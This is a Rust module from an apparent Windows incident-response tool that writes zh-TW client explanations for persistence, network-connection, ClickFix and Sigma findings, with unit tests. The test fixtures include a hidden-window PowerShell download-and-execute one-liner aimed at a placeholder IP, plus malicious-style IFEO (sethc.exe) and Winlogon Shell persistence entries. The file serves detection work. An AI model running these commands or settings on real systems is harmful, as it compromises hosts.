//! FR18: plain zh-TW client-facing text for Findings >= Medium severity.
//!
//! All client wording for heuristic findings lives here, chosen from typed fields —
//! `Finding.analyzer` (which analyzer produced it) and, for persistence findings,
//! `entity.persistence.mechanism` — never by parsing the title or reason. Analyzers
//! produce technical facts; this module turns them into client sentences.
//!
//! Exception: `heur_eventlog` still writes its own per-event `details_client` (each
//! event ID has its own sentence built from event fields the Finding does not carry
//! in structured form); a heuristic finding that arrives with text already set keeps
//! it.
//!
//! `fill_details_client` is a no-op below Medium. It takes the run time from the
//! caller (the manifest's start time) so the "N 天前新增" hints are reproducible and
//! the report never depends on the wall clock at write time.
#![forbid(unsafe_code)]

use chrono::{DateTime, Duration, Utc};

use cairn_core::analyzers;
use cairn_core::finding::{Finding, FindingSource, Severity};
use cairn_core::Mechanism;

fn is_medium_or_above(s: Severity) -> bool {
    matches!(s, Severity::Critical | Severity::High | Severity::Medium)
}

/// Return the last path segment, stripping surrounding double-quotes first.
fn short_name(path: &str) -> String {
    path.trim_matches('"')
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(path)
        .to_owned()
}

/// Best human-readable name for the implicated entity.
///
/// Priority: process image > file path >
///   registry data (if it looks like a path) > registry value name >
///   registry key last segment > "未知程式".
fn entity_name(f: &Finding) -> String {
    if let Some(p) = &f.entity.process {
        return short_name(&p.image);
    }
    if let Some(fi) = &f.entity.file {
        return short_name(&fi.path);
    }
    if let Some(reg) = &f.entity.registry {
        let data = reg.data.trim_matches('"');
        if data.contains('\\') || data.starts_with('%') {
            return short_name(data);
        }
        if !reg.value.is_empty() {
            return reg.value.clone();
        }
        if let Some(seg) = reg.key.rsplit('\\').next() {
            if !seg.is_empty() {
                return seg.to_owned();
            }
        }
    }
    "未知程式".to_owned()
}

/// Human-readable relative-time hint derived from a last-write time.
fn timing_hint(last_write: Option<DateTime<Utc>>, now: DateTime<Utc>) -> String {
    match last_write {
        Some(lw) => {
            let age = now.signed_duration_since(lw);
            if age >= Duration::zero() && age <= Duration::days(30) {
                format!("{}天前新增", age.num_days())
            } else {
                "時間較久遠".to_owned()
            }
        }
        None => "時間不明".to_owned(),
    }
}

/// Plain zh-TW name of each persistence mechanism, for the generic template.
fn mechanism_label(m: Mechanism) -> &'static str {
    match m {
        Mechanism::RunKey => "登錄檔自動啟動（Run 機碼）",
        Mechanism::Service => "系統服務",
        Mechanism::ScheduledTask => "排程工作",
        Mechanism::WmiSubscription => "WMI 事件訂閱",
        Mechanism::Ifeo => "IFEO 偵錯程式設定",
        Mechanism::Startup => "啟動資料夾",
        Mechanism::Winlogon => "Winlogon 登入設定",
        Mechanism::ExplorerPolicyRun => "群組原則自動執行",
        Mechanism::BootExecute => "開機前執行程式（BootExecute）",
        Mechanism::LsaAuthPackage => "LSA 驗證套件",
        Mechanism::LsaSecurityPackage => "LSA 安全性套件",
        Mechanism::LsaNotificationPackage => "密碼篩選器",
        Mechanism::TimeProvider => "時間提供者",
        Mechanism::WinlogonNotify => "Winlogon 通知套件",
        Mechanism::WinlogonMpnotify => "Winlogon MPNotify 程式",
        Mechanism::PrintMonitor => "列印監視器",
        Mechanism::ActiveSetup => "Active Setup",
        Mechanism::Screensaver => "螢幕保護程式",
        Mechanism::NetshHelper => "netsh 輔助 DLL",
        Mechanism::AppcertDlls => "AppCertDlls",
        Mechanism::AppinitDlls => "AppInit_DLLs",
        Mechanism::SilentExitMonitor => "程式結束監視（SilentProcessExit）",
        Mechanism::ComHijack => "COM 元件登錄",
        Mechanism::CmdAutorun => "命令提示字元 AutoRun",
        Mechanism::OfficeTest => "Office Test 機碼",
        Mechanism::LogonScript => "使用者登入腳本",
        Mechanism::PsProfile => "PowerShell 設定檔",
        Mechanism::Other => "自動執行設定",
    }
}

/// Mechanism-specific zh-TW sentence for a heur_persist finding.
fn persistence_client_text(host: &str, f: &Finding, now: DateTime<Utc>) -> String {
    let reg = f.entity.registry.as_ref();
    let file = f.entity.file.as_ref();
    let bin = reg
        .filter(|r| !r.data.trim().is_empty())
        .map(|r| short_name(r.data.trim_matches('"')))
        .or_else(|| file.map(|fi| short_name(&fi.path)))
        .unwrap_or_else(|| entity_name(f));
    let key_leaf = reg
        .and_then(|r| r.key.rsplit('\\').next().map(str::to_owned))
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| entity_name(f));
    let value_name = reg
        .map(|r| r.value.as_str())
        .filter(|v| !v.is_empty())
        .unwrap_or("?");
    let timing = timing_hint(
        reg.and_then(|r| r.last_write)
            .or_else(|| file.and_then(|fi| fi.mtime)),
        now,
    );

    let Some(mechanism) = f.entity.persistence.as_ref().map(|p| p.mechanism) else {
        return format!(
            "主機 {host} 上，{} 疑似建立了持久化機制（{timing}），建議確認該項目是否為已知且授權的軟體。",
            entity_name(f)
        );
    };
    match mechanism {
        Mechanism::Service => format!(
            "主機 {host} 上偵測到服務 {key_leaf} 指向 {bin}（{timing}），建議確認是否為已知且授權的軟體。"
        ),
        Mechanism::RunKey => format!(
            "主機 {host} 上，自動啟動項目「{value_name}」會在登入時執行 {bin}（{timing}），建議確認是否為已知且授權的操作。"
        ),
        Mechanism::Startup => format!(
            "主機 {host} 上，啟動資料夾中的 {bin} 會在登入時自動執行（{timing}），建議確認是否為已知且授權的操作。"
        ),
        Mechanism::ScheduledTask => format!(
            "主機 {host} 上偵測到排程工作 {key_leaf} 指向 {bin}（{timing}），建議確認是否為已知且授權的操作。"
        ),
        Mechanism::Winlogon => format!(
            "主機 {host} 上，Winlogon {value_name} 設定為 {bin}（{timing}），若非預期值請立即調查。"
        ),
        Mechanism::Ifeo => format!(
            "主機 {host} 上，{key_leaf} 的 IFEO Debugger 被設定為 {bin}，此手法幾乎僅用於攻擊，建議立即調查。"
        ),
        Mechanism::WmiSubscription => format!(
            "主機 {host} 上偵測到 WMI 事件訂閱 {value_name}，會在特定事件發生時自動執行指令或腳本；\
             一般電腦很少有這類設定，建議立即調查。"
        ),
        Mechanism::PsProfile => format!(
            "主機 {host} 上的 PowerShell 設定檔 {bin} 會在每次開啟 PowerShell 時執行，\
             內容含有下載或編碼指令，建議立即調查。"
        ),
        other => format!(
            "主機 {host} 上，{bin} 透過「{}」設定為自動執行（{timing}），建議確認該項目是否為已知且授權的軟體。",
            mechanism_label(other)
        ),
    }
}

/// zh-TW sentence for network-connection findings, naming the owning process.
fn netconn_client_text(host: &str, f: &Finding) -> String {
    let proc_name = f
        .entity
        .process
        .as_ref()
        .map(|p| short_name(&p.image))
        .unwrap_or_else(|| "未知程式".to_owned());
    let remote = f
        .entity
        .netconn
        .as_ref()
        .map(|c| {
            format!(
                "{}:{}",
                c.raddr.as_deref().unwrap_or("-"),
                c.rport.map(|p| p.to_string()).unwrap_or_else(|| "-".into())
            )
        })
        .unwrap_or_else(|| "未知目標".to_owned());
    format!(
        "主機 {} 上，{} 發起了對外連線至 {}，建議確認連線目標是否屬於正常業務範疇。",
        host, proc_name, remote
    )
}

/// zh-TW sentence for a ClickFix Run-dialog finding: the typed command is the
/// registry value data.
fn clickfix_client_text(f: &Finding) -> String {
    let typed = f
        .entity
        .registry
        .as_ref()
        .map(|r| r.data.as_str())
        .unwrap_or("-");
    format!(
        "有人在這台主機的「執行」對話框（Win+R）輸入了：{typed}。\
         假驗證碼或假錯誤頁面常要使用者貼上這類指令來下載惡意程式（ClickFix 手法）；\
         請詢問使用者當時看到什麼畫面，並檢查這個指令下載或執行了什麼。"
    )
}

/// Fill `details_client` for a Medium+ finding. `now` is the run's reference time
/// (manifest `run.started_utc`).
pub fn fill_details_client(f: &mut Finding, now: DateTime<Utc>) {
    if !is_medium_or_above(f.severity) {
        return;
    }
    // An analyzer that wrote its own event-specific text knows more than the generic
    // per-analyzer templates below; keep it.
    if f.source == FindingSource::Heuristic && f.details_client.is_some() {
        return;
    }
    let host = f.host.clone();
    let text = match f.source {
        FindingSource::Heuristic => match f.analyzer.as_str() {
            analyzers::PARENTCHILD => format!(
                "主機 {} 上，{} 以非預期的父行程方式執行，\
                 可能為偽裝或橫向移動，建議確認該執行是否屬於正常業務操作。",
                host,
                entity_name(f)
            ),
            analyzers::PERSIST => persistence_client_text(&host, f, now),
            analyzers::NETCONN => netconn_client_text(&host, f),
            analyzers::CLICKFIX => clickfix_client_text(f),
            _ => format!("主機 {} 上偵測到疑似異常行為，建議分析師確認詳情。", host),
        },
        FindingSource::Sigma => {
            let title = f.title.clone();
            match f.severity {
                Severity::Critical | Severity::High => format!(
                    "主機 {} 上偵測到與「{}」相關的可疑活動，\
                     此類活動具有較高風險，建議盡速進行調查。",
                    host, title
                ),
                _ => format!(
                    "主機 {} 上偵測到與「{}」相關的活動，\
                     建議分析師評估是否為授權操作。",
                    host, title
                ),
            }
        }
    };
    f.details_client = Some(text);
}

#[cfg(test)]
mod tests {
    use super::*;
    use cairn_core::finding::{EntityNetConn, EntityProcess, Finding, FindingSource, Severity};
    use cairn_core::record::{PersistenceRecord, Record, RegValueRecord};
    use cairn_core::traits::Analyzer;
    use chrono::TimeZone;

    /// Fixed run time: client text must not depend on the wall clock.
    fn run_time() -> DateTime<Utc> {
        Utc.with_ymd_and_hms(2026, 10, 20, 12, 0, 0).unwrap()
    }

    fn make_heuristic(severity: Severity, analyzer: &str) -> Finding {
        let mut f = Finding::new(severity, "test", FindingSource::Heuristic);
        f.host = "WS01".into();
        f.analyzer = analyzer.into();
        f.entity.process = Some(EntityProcess {
            pid: 1,
            ppid: 0,
            image: r"C:\Windows\cmd.exe".into(),
            cmdline: String::new(),
            signed: None,
            integrity: None,
        });
        f
    }

    fn make_sigma(severity: Severity, title: &str) -> Finding {
        let mut f = Finding::new(severity, title, FindingSource::Sigma);
        f.host = "WS01".into();
        f
    }

    fn prec(
        mechanism: Mechanism,
        location: &str,
        value: Option<&str>,
        command: &str,
        signed: Option<bool>,
        last_write: Option<DateTime<Utc>>,
    ) -> PersistenceRecord {
        PersistenceRecord {
            mechanism,
            location: location.into(),
            value: value.map(String::from),
            command: Some(command.into()),
            binary_path: Some(command.trim_matches('"').into()),
            binary_sha256: None,
            signed,
            signer: None,
            last_write,
            bound: None,
            signer_source: None,
        }
    }

    /// Run the REAL persistence analyzer and fill client text on its single finding —
    /// the test exercises the title/entity shape production actually emits.
    fn persist_text(p: PersistenceRecord) -> String {
        let findings = cairn_heur::PersistHeuristic
            .analyze(&[Record::Persistence(p)], &[])
            .unwrap();
        assert_eq!(findings.len(), 1, "fixture must gate exactly one finding");
        let mut f = findings.into_iter().next().unwrap();
        assert!(
            !f.title.starts_with("Suspicious persistence: "),
            "real titles are '<label>: <name>': {}",
            f.title
        );
        f.host = "WS01".into();
        fill_details_client(&mut f, run_time());
        f.details_client
            .expect("persist findings here are >= Medium")
    }

    #[test]
    fn heuristic_supplied_text_is_kept() {
        let mut f = make_heuristic(Severity::High, analyzers::EVENTLOG);
        f.details_client = Some("自訂說明".into());
        fill_details_client(&mut f, run_time());
        assert_eq!(f.details_client.as_deref(), Some("自訂說明"));
    }

    #[test]
    fn parent_child_heuristic_filled() {
        let mut f = make_heuristic(Severity::High, analyzers::PARENTCHILD);
        fill_details_client(&mut f, run_time());
        let text = f.details_client.expect("must be Some for High");
        assert!(text.contains("非預期的父行程"), "got: {text}");
        assert!(text.contains("WS01"), "host missing: {text}");
        assert!(text.contains("cmd.exe"), "path missing: {text}");
    }

    #[test]
    fn netconn_heuristic_filled() {
        let mut f = make_heuristic(Severity::High, analyzers::NETCONN);
        fill_details_client(&mut f, run_time());
        let text = f.details_client.expect("must be Some for High");
        assert!(text.contains("對外連線"), "got: {text}");
    }

    #[test]
    fn other_heuristic_filled() {
        let mut f = make_heuristic(Severity::Medium, "heur_unknown");
        fill_details_client(&mut f, run_time());
        let text = f.details_client.expect("must be Some for Medium");
        assert!(text.contains("疑似異常行為"), "got: {text}");
    }

    #[test]
    fn sigma_high_filled() {
        let mut f = make_sigma(Severity::High, "Mimikatz Credential Dumping");
        fill_details_client(&mut f, run_time());
        let text = f.details_client.expect("must be Some for High");
        assert!(text.contains("較高風險"), "got: {text}");
        assert!(
            text.contains("Mimikatz Credential Dumping"),
            "title missing: {text}"
        );
    }

    #[test]
    fn sigma_medium_filled() {
        let mut f = make_sigma(Severity::Medium, "Suspicious PowerShell");
        fill_details_client(&mut f, run_time());
        let text = f.details_client.expect("must be Some for Medium");
        assert!(text.contains("評估是否為授權操作"), "got: {text}");
    }

    #[test]
    fn low_severity_not_filled() {
        let mut f = make_sigma(Severity::Low, "Low Noise Rule");
        fill_details_client(&mut f, run_time());
        assert!(f.details_client.is_none(), "Low must remain None");

        let mut f2 = make_heuristic(Severity::Info, analyzers::PARENTCHILD);
        fill_details_client(&mut f2, run_time());
        assert!(f2.details_client.is_none(), "Info must remain None");
    }

    #[test]
    fn entity_path_falls_back_to_unknown_when_no_entity() {
        let mut f = make_heuristic(Severity::High, analyzers::PARENTCHILD);
        f.entity.process = None;
        fill_details_client(&mut f, run_time());
        let text = f.details_client.unwrap();
        assert!(text.contains("未知程式"), "fallback path missing: {text}");
    }

    // ── persistence: real PersistHeuristic findings, mechanism-specific text ──

    /// Regression: client text used to strip "Suspicious persistence: " from the
    /// title, but real titles are "<zh label>: <name>", so every real finding fell
    /// into the generic template. A real service finding now names service + binary.
    #[test]
    fn real_service_finding_gets_service_text_with_binary_and_host() {
        let text = persist_text(prec(
            Mechanism::Service,
            r"HKLM\SYSTEM\CurrentControlSet\Services\EvilSvc",
            Some("EvilSvc"),
            r"C:\Users\x\AppData\Local\Temp\evil.exe",
            Some(false),
            Some(run_time() - Duration::days(2)),
        ));
        assert!(text.contains("服務 EvilSvc"), "{text}");
        assert!(text.contains("evil.exe"), "{text}");
        assert!(text.contains("WS01"), "{text}");
        assert!(
            text.contains("2天前新增"),
            "uses the given run time: {text}"
        );
        assert!(
            !text.contains("持久化機制"),
            "not the generic template: {text}"
        );
    }

    #[test]
    fn real_run_key_finding_names_value_and_binary() {
        let text = persist_text(prec(
            Mechanism::RunKey,
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            Some("Updater"),
            r"C:\Users\x\AppData\Roaming\upd.exe",
            Some(false),
            None,
        ));
        assert!(text.contains("自動啟動項目「Updater」"), "{text}");
        assert!(text.contains("upd.exe"), "{text}");
        assert!(text.contains("時間不明"), "{text}");
    }

    #[test]
    fn real_ifeo_finding_warns_about_attack() {
        let text = persist_text(prec(
            Mechanism::Ifeo,
            r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe",
            Some("sethc.exe"),
            r"C:\Temp\cmd.exe",
            None,
            None,
        ));
        assert!(text.contains("sethc.exe 的 IFEO Debugger"), "{text}");
        assert!(text.contains("幾乎僅用於攻擊"), "{text}");
    }

    #[test]
    fn real_winlogon_finding_mentions_value() {
        let text = persist_text(prec(
            Mechanism::Winlogon,
            r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon",
            Some("Shell"),
            r"explorer.exe,C:\Users\Public\evil.exe",
            None,
            None,
        ));
        assert!(text.contains("Winlogon Shell"), "{text}");
    }

    #[test]
    fn real_scheduled_task_finding_names_task() {
        let text = persist_text(prec(
            Mechanism::ScheduledTask,
            r"\Microsoft\Windows\Updater",
            Some("Updater"),
            r"C:\ProgramData\upd\upd.exe",
            Some(false),
            None,
        ));
        assert!(text.contains("排程工作 Updater"), "{text}");
        assert!(text.contains("upd.exe"), "{text}");
    }

    #[test]
    fn real_catalog_mechanism_uses_its_own_label() {
        let text = persist_text(prec(
            Mechanism::AppinitDlls,
            r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
            Some("AppInit_DLLs"),
            r"C:\Users\Public\hook.dll",
            None,
            None,
        ));
        assert!(text.contains("「AppInit_DLLs」"), "{text}");
        assert!(text.contains("hook.dll"), "{text}");
    }

    /// The registry data names a vendor binary: the text never says "未知程式".
    #[test]
    fn real_service_text_is_never_unknown_program() {
        let text = persist_text(prec(
            Mechanism::Service,
            r"HKLM\SYSTEM\CurrentControlSet\Services\CoworkVMService",
            Some("CoworkVMService"),
            r#""C:\Tools\cowork-svc.exe""#,
            None,
            Some(run_time() - Duration::days(1)),
        ));
        assert!(!text.contains("未知程式"), "{text}");
        assert!(text.contains("cowork-svc.exe"), "{text}");
    }

    #[test]
    fn real_clickfix_finding_quotes_the_typed_command() {
        let rv = RegValueRecord {
            hive: "HKCU".into(),
            key: r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU".into(),
            value: "a".into(),
            data: r"powershell -w h -c iex(irm http://203.0.113.9/x)\1".into(),
            last_write: None,
        };
        let mut f = cairn_heur::ClickFixHeuristic
            .analyze(&[Record::RegValue(rv)], &[])
            .unwrap()
            .remove(0);
        assert!(
            f.details_client.is_none(),
            "analyzer leaves wording to report"
        );
        fill_details_client(&mut f, run_time());
        let text = f.details_client.unwrap();
        assert!(text.contains("Win+R"), "{text}");
        assert!(text.contains("irm http://203.0.113.9/x"), "{text}");
    }

    // ── netconn: owning process naming ───────────────────────────────────────

    #[test]
    fn netconn_client_text_includes_process_name() {
        let mut f = make_heuristic(Severity::High, analyzers::NETCONN);
        f.entity.netconn = Some(EntityNetConn {
            laddr: "192.168.0.1".into(),
            lport: 50000,
            raddr: Some("185.0.0.1".into()),
            rport: Some(4444),
            pid: Some(1234),
        });
        f.entity.process = Some(EntityProcess {
            pid: 1234,
            ppid: 4,
            image: r"C:\Users\x\AppData\Local\Temp\beacon.exe".into(),
            cmdline: String::new(),
            signed: None,
            integrity: None,
        });
        fill_details_client(&mut f, run_time());
        let text = f.details_client.unwrap();
        assert!(text.contains("beacon.exe"), "must name process: {text}");
        assert!(text.contains("185.0.0.1:4444"), "{text}");
    }

    #[test]
    fn netconn_client_text_without_process_graceful() {
        let mut f = make_heuristic(Severity::High, analyzers::NETCONN);
        f.entity.process = None;
        f.entity.netconn = Some(EntityNetConn {
            laddr: "0.0.0.0".into(),
            lport: 50000,
            raddr: Some("185.0.0.1".into()),
            rport: Some(4444),
            pid: Some(9999),
        });
        fill_details_client(&mut f, run_time());
        let text = f.details_client.unwrap();
        assert!(text.contains("未知程式"), "{text}");
        assert!(text.contains("WS01"));
    }
}
